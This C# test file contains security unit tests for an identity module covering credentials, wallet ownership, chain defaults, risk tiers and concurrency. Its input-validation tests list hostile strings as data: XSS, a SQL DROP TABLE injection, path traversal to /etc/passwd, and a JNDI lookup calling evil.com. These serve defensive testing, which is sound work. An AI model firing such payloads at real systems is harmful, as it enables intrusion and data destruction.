using Axon.Modules.Identity.Application.DTOs.Exchange;
using Axon.Modules.Identity.Domain.Aggregates.AxonPrincipal;
using Axon.Modules.Identity.Domain.Entities;
using Axon.Modules.Identity.Domain.Enums;
using Axon.Modules.Identity.Domain.Tests.Common;
using Axon.Modules.Identity.Domain.Tests.TestData;
using Axon.Modules.Identity.Domain.ValueObjects;
using BuildingBlocks.Core.Diagnostics.Errors;
using BuildingBlocks.Primitives.Ids;
using CSharpFunctionalExtensions;
using Shouldly;

namespace Axon.Modules.Identity.Tests.Security;

/// <summary>
/// Security-focused test suite for Identity Domain.
/// Tests authentication security, data integrity, access control, and potential attack vectors.
/// </summary>
[TestFixture]
public class SecurityTests : IdentityTestBase
{
    #region Authentication Security Tests

    [TestFixture]
    public class AuthenticationSecurityTests : SecurityTests
    {
        [Test]
        public void Credential_Should_PreventDuplicateSubjectsAcrossPrincipals()
        {
            // Scenario: Prevent credential hijacking by ensuring unique subject/issuer combinations
            // Arrange
            var provider = "dynamic";
            var issuer = "dynamic:production";
            var subject = "user-123";

            var principal1 = AxonPrincipal.CreateHuman();
            var principal2 = AxonPrincipal.CreateHuman();

            var credential1 = IdentityCredential.Create(principal1.Id, provider, issuer, subject);
            var credential2 = IdentityCredential.Create(principal2.Id, provider, issuer, subject);

            // Act & Assert
            // Two credentials with same provider/issuer/subject but different principals
            // This represents a potential security issue that should be caught at the application layer
            credential1.Provider.ShouldBe(credential2.Provider);
            credential1.Issuer.ShouldBe(credential2.Issuer);
            credential1.Subject.ShouldBe(credential2.Subject);
            credential1.PrincipalId.ShouldNotBe(credential2.PrincipalId);

            // The domain allows this, but business logic should prevent it
        }

        [Test]
        public void Principal_Should_RequireValidationForCredentialUniqueness()
        {
            // Test the domain's credential addition with uniqueness check
            // Arrange
            var principal = AxonPrincipal.CreateHuman();
            var credential = CreateCredential(principal.Id, provider: "github", issuer: "github.com", subject: "user123");

            // Mock uniqueness check that returns conflict
            Func<string, string, string, Result<bool, Error>> conflictCheck = (_, _, _) => Result.Success<bool, Error>(true);

            // Act
            var result = principal.AddCredential(credential, conflictCheck);

            // Assert
            result.IsFailure.ShouldBeTrue();
            result.Error.Type.ShouldBe(ErrorType.Conflict);
            principal.Credentials.ShouldBeEmpty();
        }

        [Test]
        public void Principal_Should_AllowCredentialFromSameProvider()
        {
            // Test that multiple credentials from same provider are allowed (different subjects)
            // Arrange
            var principal = AxonPrincipal.CreateHuman();
            var credential1 = CreateCredential(principal.Id, provider: "github", issuer: "github.com", subject: "user123");
            var credential2 = CreateCredential(principal.Id, provider: "github", issuer: "github.com", subject: "user456");

            Func<string, string, string, Result<bool, Error>> noConflictCheck = (_, _, _) => Result.Success<bool, Error>(false);

            // Act
            var result1 = principal.AddCredential(credential1, noConflictCheck);
            var result2 = principal.AddCredential(credential2, noConflictCheck);

            // Assert
            result1.IsSuccess.ShouldBeTrue();
            result2.IsSuccess.ShouldBeTrue();
            principal.Credentials.Count.ShouldBe(2);
        }

        [Test]
        public void Credential_Should_UpdateLastSeenOnlyForNewerTimestamps()
        {
            // Prevent timestamp manipulation attacks
            // Arrange
            var baseTime = DateTime.UtcNow;
            var credential = CreateCredential(AxonId.New(), timestamp: baseTime);

            // Act - Try to update with older timestamp (potential replay attack)
            credential.UpdateLastSeen(baseTime.AddMinutes(-5));

            // Assert - Should not update to older timestamp
            credential.LastSeenAt.ShouldBe(baseTime);
        }

        [Test]
        public void Credential_Should_RejectExtremelyOldTimestamps()
        {
            // Arrange
            var credential = CreateCredential(AxonId.New());
            var veryOldTime = DateTime.UtcNow.AddYears(-10);

            // Act
            credential.UpdateLastSeen(veryOldTime);

            // Assert - Should not update to extremely old timestamp
            credential.LastSeenAt.ShouldBeGreaterThan(veryOldTime);
        }
    }

    #endregion

    #region Wallet Ownership Security Tests

    [TestFixture]
    public class WalletOwnershipSecurityTests : SecurityTests
    {
        [Test]
        public void WalletOwnership_Should_PreventUnauthorizedSigning()
        {
            // Test that only verified+signing ownerships can be used for critical operations
            // Arrange
            var principal = AxonPrincipal.CreateHuman();
            var walletId = WalletId.New();

            var pendingOwnership = CreateOwnership(principal.Id, walletId, AccessMode.Signing, OwnershipStatus.Pending);
            var watchOnlyOwnership = CreateOwnership(principal.Id, walletId, AccessMode.WatchOnly, OwnershipStatus.Verified);
            var revokedOwnership = CreateOwnership(principal.Id, walletId, AccessMode.Signing, OwnershipStatus.Revoked);

            // Act & Assert
            pendingOwnership.IsVerifiedSigning.ShouldBeFalse();
            watchOnlyOwnership.IsVerifiedSigning.ShouldBeFalse();
            revokedOwnership.IsVerifiedSigning.ShouldBeFalse();

            pendingOwnership.CanBeDefault.ShouldBeFalse();
            watchOnlyOwnership.CanBeDefault.ShouldBeFalse();
            revokedOwnership.CanBeDefault.ShouldBeFalse();
        }

        [Test]
        public void Principal_Should_EnforceWalletOwnershipLimits()
        {
            // Prevent wallet spam attacks
            // Arrange
            var principal = AxonPrincipal.CreateHuman();
            Func<WalletId, AccessMode, OwnershipStatus, Result<bool, Error>> noConflictCheck = (_, _, _) => Result.Success<bool, Error>(false);

            // Act - Try to add 11 wallets (exceeding the limit of 10)
            var results = new List<Result<Unit, Error>>();
            for (int i = 0; i < 11; i++)
            {
                var ownership = CreateOwnership(principal.Id, WalletId.New());
                results.Add(principal.LinkWalletOwnership(ownership, noConflictCheck));
            }

            // Assert
            results.Take(10).ShouldAllBe(r => r.IsSuccess);
            results.Last().IsFailure.ShouldBeTrue();
            results.Last().Error.Type.ShouldBe(ErrorType.Validation);
            principal.WalletOwnerships.Count.ShouldBe(10);
        }

        [Test]
        public void Principal_Should_PreventConflictingWalletOwnerships()
        {
            // Test that wallet ownership conflicts are properly detected
            // Arrange
            var principal = AxonPrincipal.CreateHuman();
            var walletId = WalletId.New();
            var ownership = CreateOwnership(principal.Id, walletId, AccessMode.Signing, OwnershipStatus.Verified);

            // Mock conflict check that detects another principal owns this wallet
            Func<WalletId, AccessMode, OwnershipStatus, Result<bool, Error>> conflictCheck =
                (wId, mode, status) => mode == AccessMode.Signing && status == OwnershipStatus.Verified
                    ? Result.Success<bool, Error>(true)
                    : Result.Success<bool, Error>(false);

            // Act
            var result = principal.LinkWalletOwnership(ownership, conflictCheck);

            // Assert
            result.IsFailure.ShouldBeTrue();
            result.Error.Type.ShouldBe(ErrorType.Conflict);
            principal.WalletOwnerships.ShouldBeEmpty();
        }

        [Test]
        public void WalletOwnership_Should_EnforceValidStatusTransitions()
        {
            // Test that ownership status follows secure transition rules
            // Arrange
            var ownership = CreateOwnership(AxonId.New(), WalletId.New(), status: OwnershipStatus.Verified);

            // Act & Assert - All transitions should be valid in current implementation
            ownership.UpdateStatus(OwnershipStatus.Revoked).IsSuccess.ShouldBeTrue();
            ownership.UpdateStatus(OwnershipStatus.Verified).IsSuccess.ShouldBeTrue(); // Re-verification allowed
            ownership.UpdateStatus(OwnershipStatus.Pending).IsSuccess.ShouldBeTrue();
        }

        [Test]
        public void WalletOwnership_Should_PreventModificationWhenRevoked()
        {
            // Test that revoked ownerships cannot be modified
            // Arrange
            var ownership = CreateOwnership(AxonId.New(), WalletId.New(), AccessMode.Signing, OwnershipStatus.Revoked);

            // Act
            var result = ownership.UpdateAccessMode(AccessMode.WatchOnly);

            // Assert
            result.IsFailure.ShouldBeTrue();
            result.Error.Type.ShouldBe(ErrorType.Validation);
            ownership.AccessMode.ShouldBe(AccessMode.Signing); // Should remain unchanged
        }
    }

    #endregion

    #region Chain Default Security Tests

    [TestFixture]
    public class ChainDefaultSecurityTests : SecurityTests
    {
        [Test]
        public void Principal_Should_OnlyAllowVerifiedSigningWalletsAsDefaults()
        {
            // Arrange
            var principal = AxonPrincipal.CreateHuman();
            var verifiedSigningWallet = WalletId.New();
            var watchOnlyWallet = WalletId.New();
            var pendingWallet = WalletId.New();

            // Add different types of wallet ownerships
            var verifiedSigning = CreateOwnership(principal.Id, verifiedSigningWallet, AccessMode.Signing, OwnershipStatus.Verified);
            var watchOnly = CreateOwnership(principal.Id, watchOnlyWallet, AccessMode.WatchOnly, OwnershipStatus.Verified);
            var pending = CreateOwnership(principal.Id, pendingWallet, AccessMode.Signing, OwnershipStatus.Pending);

            principal.LinkWalletOwnership(verifiedSigning, NoConflictResolver);
            principal.LinkWalletOwnership(watchOnly, NoConflictResolver);
            principal.LinkWalletOwnership(pending, NoConflictResolver);

            // Act & Assert
            var verifiedResult = principal.ApplyChainDefault("ethereum-mainnet", verifiedSigningWallet);
            var watchOnlyResult = principal.ApplyChainDefault("solana-mainnet", watchOnlyWallet);
            var pendingResult = principal.ApplyChainDefault("polygon-mainnet", pendingWallet);

            verifiedResult.IsSuccess.ShouldBeTrue();
            watchOnlyResult.IsFailure.ShouldBeTrue();
            pendingResult.IsFailure.ShouldBeTrue();

            watchOnlyResult.Error.Type.ShouldBe(ErrorType.Validation);
            pendingResult.Error.Type.ShouldBe(ErrorType.Validation);
        }

        [Test]
        public void Principal_Should_PreventDefaultsForNonOwnedWallets()
        {
            // Test that defaults can only be set for owned wallets
            // Arrange
            var principal = AxonPrincipal.CreateHuman();
            var nonOwnedWalletId = WalletId.New();

            // Act
            var result = principal.ApplyChainDefault("ethereum-mainnet", nonOwnedWalletId);

            // Assert
            result.IsFailure.ShouldBeTrue();
            result.Error.Type.ShouldBe(ErrorType.NotFound);
        }
    }

    #endregion

    #region Service Principal Security Tests

    [TestFixture]
    public class ServicePrincipalSecurityTests : SecurityTests
    {
        [Test]
        public void ServicePrincipal_Should_OnlyAllowLowRiskTier()
        {
            // Test that service principals cannot have elevated risk tiers
            // Arrange
            var servicePrincipal = AxonPrincipal.CreateService();

            // Act & Assert
            var mediumRiskResult = servicePrincipal.UpdateRiskTier(RiskTier.Medium);
            var highRiskResult = servicePrincipal.UpdateRiskTier(RiskTier.High);

            mediumRiskResult.IsFailure.ShouldBeTrue();
            highRiskResult.IsFailure.ShouldBeTrue();

            mediumRiskResult.Error.Type.ShouldBe(ErrorType.Validation);
            highRiskResult.Error.Type.ShouldBe(ErrorType.Validation);

            servicePrincipal.RiskTier.ShouldBe(RiskTier.Low);
        }

        [Test]
        public void ServicePrincipal_Should_AllowLowRiskTier()
        {
            // Arrange
            var servicePrincipal = AxonPrincipal.CreateService();

            // Act
            var result = servicePrincipal.UpdateRiskTier(RiskTier.Low);

            // Assert
            result.IsSuccess.ShouldBeTrue();
            servicePrincipal.RiskTier.ShouldBe(RiskTier.Low);
        }
    }

    #endregion

    #region Data Validation Security Tests

    [TestFixture]
    public class DataValidationSecurityTests : SecurityTests
    {
        [Test]
        public void ExchangeUserData_Should_PreventInjectionAttempts()
        {
            // Test that potentially malicious input is handled safely
            var maliciousInputs = new[]
            {
                "<script>alert('xss')</script>",
                "'; DROP TABLE users; --",
                "../../../etc/passwd",
                "{{7*7}}",
                "${jndi:ldap://evil.com/a}",
                "\\u0000\\u0001\\u0002"
            };

            foreach (var maliciousInput in maliciousInputs)
            {
                // Arrange
                var userData = new ExchangeUserData(
                    AxonUserId: maliciousInput,
                    Email: "test@example.com", // Keep email valid
                    EnvironmentId: maliciousInput,
                    Wallets: new List<ExchangeWalletData>()
                );

                // Act & Assert - Domain should handle these as regular strings
                userData.AxonUserId.ShouldBe(maliciousInput);
                userData.EnvironmentId.ShouldBe(maliciousInput);
                // Security protection happens at validation and persistence layers
            }
        }

        [Test]
        public void Address_Should_RejectObviouslyInvalidFormats()
        {
            // Test address validation security
            var invalidAddresses = new[]
            {
                "", // Empty
                "x", // Too short
                "javascript:alert(1)", // JavaScript protocol
                "data:text/html,<script>alert(1)</script>", // Data URL
                new string('a', 300), // Too long
                "0x" + new string('g', 40), // Invalid hex characters
            };

            foreach (var invalidAddress in invalidAddresses)
            {
                // Act
                var result = Address.TryCreate(invalidAddress);

                // Assert
                result.IsFailure.ShouldBeTrue($"Address '{invalidAddress}' should be invalid");
            }
        }

        [Test]
        public void ProviderType_Should_RejectMaliciousProviders()
        {
            // Test that provider types are properly validated
            var maliciousProviders = new[]
            {
                "",
                "   ",
                "../admin",
                "http://evil.com",
                "javascript:alert(1)",
                new string('a', 1000),
                "provider with spaces",
                "provider@domain.com"
            };

            foreach (var maliciousProvider in maliciousProviders)
            {
                // Act
                var result = ProviderType.TryCreate(maliciousProvider);

                // Assert - Some may be rejected, some may be sanitized
                if (result.IsFailure)
                {
                    result.Error.Type.ShouldBe(ErrorType.Validation);
                }
            }
        }
    }

    #endregion

    #region Race Condition and Concurrency Security Tests

    [TestFixture]
    public class ConcurrencySecurityTests : SecurityTests
    {
        [Test]
        public void Principal_Should_HandleConcurrentCredentialAddition()
        {
            // Test that concurrent credential additions are handled safely
            // Arrange
            var principal = AxonPrincipal.CreateHuman();
            var credential = CreateCredential(principal.Id);

            Func<string, string, string, Result<bool, Error>> noConflictCheck = (_, _, _) => Result.Success<bool, Error>(false);

            // Act - Simulate concurrent additions
            var tasks = new List<Task<Result<Unit, Error>>>();
            for (int i = 0; i < 5; i++)
            {
                tasks.Add(Task.Run(() => principal.AddCredential(credential, noConflictCheck)));
            }

            Task.WaitAll(tasks.ToArray());

            // Assert - Should be idempotent (only one credential added)
            principal.Credentials.ShouldHaveSingleItem();
            tasks.ShouldAllBe(task => task.Result.IsSuccess);
        }

        [Test]
        public void Principal_Should_HandleConcurrentWalletLinking()
        {
            // Test concurrent wallet ownership linking
            // Arrange
            var principal = AxonPrincipal.CreateHuman();
            var ownership = CreateOwnership(principal.Id);

            Func<WalletId, AccessMode, OwnershipStatus, Result<bool, Error>> noConflictCheck = (_, _, _) => Result.Success<bool, Error>(false);

            // Act - Simulate concurrent linking
            var tasks = new List<Task<Result<Unit, Error>>>();
            for (int i = 0; i < 5; i++)
            {
                tasks.Add(Task.Run(() => principal.LinkWalletOwnership(ownership, noConflictCheck)));
            }

            Task.WaitAll(tasks.ToArray());

            // Assert - Should be idempotent
            principal.WalletOwnerships.ShouldHaveSingleItem();
            tasks.ShouldAllBe(task => task.Result.IsSuccess);
        }

        [Test]
        public void ChainDefault_Should_HandleConcurrentUpdates()
        {
            // Test concurrent chain default updates
            // Arrange
            var chainDefault = PrincipalChainDefault.Create(AxonId.New(), "ethereum-mainnet", WalletId.New());
            var walletIds = Enumerable.Range(0, 5).Select(_ => WalletId.New()).ToArray();

            // Act - Simulate concurrent updates
            var tasks = new List<Task>();
            foreach (var walletId in walletIds)
            {
                tasks.Add(Task.Run(() => chainDefault.UpdateWallet(walletId)));
            }

            Task.WaitAll(tasks.ToArray());

            // Assert - Should have one of the wallet IDs
            walletIds.ShouldContain(chainDefault.WalletId);
        }
    }

    #endregion

    #region Authorization Security Tests

    [TestFixture]
    public class AuthorizationSecurityTests : SecurityTests
    {
        [Test]
        public void Principal_Should_EnforceOwnershipForChainDefaults()
        {
            // Test that principals can only set defaults for wallets they own
            // Arrange
            var principal1 = AxonPrincipal.CreateHuman();
            var principal2 = AxonPrincipal.CreateHuman();

            var wallet1 = WalletId.New();
            var wallet2 = WalletId.New();

            // Principal1 owns wallet1, Principal2 owns wallet2
            var ownership1 = CreateOwnership(principal1.Id, wallet1, AccessMode.Signing, OwnershipStatus.Verified);
            var ownership2 = CreateOwnership(principal2.Id, wallet2, AccessMode.Signing, OwnershipStatus.Verified);

            principal1.LinkWalletOwnership(ownership1, NoConflictResolver);
            principal2.LinkWalletOwnership(ownership2, NoConflictResolver);

            // Act - Try to set defaults for wallets not owned
            var result1 = principal1.ApplyChainDefault("ethereum-mainnet", wallet2); // Principal1 tries to use Principal2's wallet
            var result2 = principal2.ApplyChainDefault("ethereum-mainnet", wallet1); // Principal2 tries to use Principal1's wallet

            // Assert
            result1.IsFailure.ShouldBeTrue();
            result2.IsFailure.ShouldBeTrue();
            result1.Error.Type.ShouldBe(ErrorType.NotFound);
            result2.Error.Type.ShouldBe(ErrorType.NotFound);
        }

        [Test]
        public void Principal_Should_AllowAccessToOwnedResources()
        {
            // Test that principals can access their own resources
            // Arrange
            var principal = AxonPrincipal.CreateHuman();
            var walletId = WalletId.New();
            var ownership = CreateOwnership(principal.Id, walletId, AccessMode.Signing, OwnershipStatus.Verified);

            principal.LinkWalletOwnership(ownership, NoConflictResolver);

            // Act
            var setDefaultResult = principal.ApplyChainDefault("ethereum-mainnet", walletId);
            var removeOwnershipResult = principal.RemoveWalletOwnership(walletId);

            // Assert
            setDefaultResult.IsSuccess.ShouldBeTrue();
            removeOwnershipResult.IsSuccess.ShouldBeTrue();
        }
    }

    #endregion

    #region Security Assertion Helpers

    /// <summary>
    /// Security-specific assertion helpers.
    /// </summary>
    public static class SecurityAssertions
    {
        public static void ShouldBeSecurelyConfigured(this AxonPrincipal principal)
        {
            // Basic security checks for a principal
            principal.Id.Value.ShouldNotBe(Guid.Empty);
            principal.Type.ShouldBeOneOf(PrincipalType.Human, PrincipalType.Service);

            // Service principals should have restricted risk tiers
            if (principal.Type == PrincipalType.Service)
            {
                principal.RiskTier.ShouldBe(RiskTier.Low);
            }

            // Should not have excessive ownerships
            principal.WalletOwnerships.Count.ShouldBeLessThanOrEqualTo(10);

            // All ownerships should be valid
            foreach (var ownership in principal.WalletOwnerships)
            {
                ownership.WalletId.Value.ShouldNotBe(Guid.Empty);
                ownership.PrincipalId.ShouldBe(principal.Id);
            }

            // Chain defaults should only reference owned wallets
            var ownedWalletIds = principal.WalletOwnerships.Select(o => o.WalletId).ToHashSet();
            foreach (var chainDefault in principal.PrincipalChainDefaults)
            {
                ownedWalletIds.ShouldContain(chainDefault.WalletId);
            }
        }

        public static void ShouldNotHaveSecurityVulnerabilities(this WalletOwnership ownership)
        {
            // Security checks for wallet ownership
            ownership.PrincipalId.Value.ShouldNotBe(Guid.Empty);
            ownership.WalletId.Value.ShouldNotBe(Guid.Empty);
            ownership.Status.ShouldBeOneOf(OwnershipStatus.Pending, OwnershipStatus.Verified, OwnershipStatus.Revoked);
            ownership.AccessMode.ShouldBeOneOf(AccessMode.Signing, AccessMode.WatchOnly);

            // Revoked ownerships should not be usable for critical operations
            if (ownership.Status == OwnershipStatus.Revoked)
            {
                ownership.IsVerifiedSigning.ShouldBeFalse();
                ownership.CanBeDefault.ShouldBeFalse();
                ownership.IsActive.ShouldBeFalse();
            }

            // Only verified signing ownerships should be usable as defaults
            if (ownership.CanBeDefault)
            {
                ownership.Status.ShouldBe(OwnershipStatus.Verified);
                ownership.AccessMode.ShouldBe(AccessMode.Signing);
            }
        }
    }

    #endregion
}